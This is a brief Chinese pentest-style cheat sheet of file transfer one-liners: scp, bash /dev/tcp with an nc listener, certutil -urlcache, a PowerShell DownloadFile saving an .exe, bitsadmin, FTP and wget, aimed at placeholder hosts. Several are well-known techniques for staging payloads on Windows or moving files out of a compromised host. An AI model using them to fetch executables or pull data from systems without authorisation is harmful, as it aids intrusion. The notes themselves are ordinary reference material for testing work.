# 文件传输

> ### 脚本下载
> python, perl, vb, php, ruby等等

> ### SCP
> ```bash
> # 上传
> scp a.txt root@10.10.10.10:~/a.txt
> # 下载
> scp root@10.10.10.10:/home/root/a.txt ./1.txt
> ```

> ### Bash /dev/tcp
> ```bash
> # 服务端
> nc -lp 1444 < a.txt
> # 客户端下载
> bash -c 'cat < /dev/tcp/10.10.10.10/1444 > a.txt'
> ```

> ### nc
> ```bash
> cat file | nc -lp 4444
> ```

> ### certutil
> ```powershell
> certutil -urlcache -split -f http://10.10.10.10:80/a.exe
> ```

> ### powershell
> ```powershell
> powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10:1234/a.txt', 'a.exe')
> ```

> ### notepad
> notepad打开文件处输入完整URL即可成功下载  
> notepad将会获取URL的内容并展示出来  

> ### FTP
> ```
> open [servername/ip]  
> user [useraname]  
> get [filename]  
> ! 返回本地shell  
> exit 返回ftp服务器  
> ```

> ### Bitsadmin
> ```powershell
>bitsadmin /transfer jobname http://prodserver/audio.wma c:\downloads\audio.wma
> ```

> ### Wget
> ```bash
> wget http://example.com/file
> ```


